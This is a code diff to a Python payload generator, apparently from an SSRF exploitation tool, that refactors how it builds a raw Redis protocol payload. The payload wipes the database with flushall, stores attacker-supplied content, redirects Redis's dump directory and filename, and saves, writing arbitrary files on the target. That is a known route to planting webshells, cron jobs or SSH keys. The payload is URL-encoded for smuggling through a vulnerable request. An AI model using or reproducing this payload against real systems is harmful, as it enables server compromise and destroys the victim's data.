@@ -1,4 +1,3 @@
-
 from .base import *
 import os
 
@@ -34,50 +33,46 @@ class Redis(GENERATOR):
         content = self.content
         dir = self.dir
         filename = self.filename
-        len_content = len(content) + 4
-        
-        payload = f"""*1\r
-$8\r
-flushall\r
-*3\r
-$3\r
-set\r
-$1\r
-1\r
-${str(len_content)}\r
+        redis_value = f"\n\n{content}\n\n"
 
-
-{content}
-
-
-\r
-*4\r
-$6\r
-config\r
-$3\r
-set\r
-$3\r
-dir\r
-${str(len(dir))}\r
-{dir}\r
-*4\r
-$6\r
-config\r
-$3\r
-set\r
-$10\r
-dbfilename\r
-${str(len(filename))}\r
-{filename}\r
-*1\r
-$4\r
-save\r
-
-"""
+        payload = "".join([
+            "*1\r\n",
+            "$8\r\n",
+            "flushall\r\n",
+            "*3\r\n",
+            "$3\r\n",
+            "set\r\n",
+            "$1\r\n",
+            "1\r\n",
+            f"${len(redis_value)}\r\n",
+            redis_value,
+            "\r\n",
+            "*4\r\n",
+            "$6\r\n",
+            "config\r\n",
+            "$3\r\n",
+            "set\r\n",
+            "$3\r\n",
+            "dir\r\n",
+            f"${len(dir)}\r\n",
+            f"{dir}\r\n",
+            "*4\r\n",
+            "$6\r\n",
+            "config\r\n",
+            "$3\r\n",
+            "set\r\n",
+            "$10\r\n",
+            "dbfilename\r\n",
+            f"${len(filename)}\r\n",
+            f"{filename}\r\n",
+            "*1\r\n",
+            "$4\r\n",
+            "save\r\n",
+        ])
 
         self.set_mode(PAYLOAD_TYPE.QUOTE_PLUS).set_payload(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
         return super().generate()
-    
+
     def wizard_content(self):
         content = input("\033[96m" + "Content: " + "\033[0m")
         return content
